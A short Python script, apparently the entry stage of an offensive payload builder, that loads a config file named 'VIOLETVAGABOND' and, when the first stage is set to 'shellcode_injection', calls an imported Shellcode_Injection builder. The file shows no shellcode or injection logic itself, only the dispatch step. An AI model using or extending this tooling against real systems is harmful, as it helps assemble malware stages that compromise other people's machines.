import json
from stage_builders.shellcode_injection import *

CONFIG = "configs/VIOLETVAGABOND.json"

config_file = open(CONFIG, "r")
parsed_conf = (json.loads(config_file.read()))

if parsed_conf['stage0']: 
    stage0 = parsed_conf['stage0']['action']
    stage0_params = parsed_conf['stage0']['action_params']
    print("Stage0: {}".format(stage0))
    if stage0 == "shellcode_injection":
        stage0_builder = Shellcode_Injection(stage0_params)
        stage0_builder.build()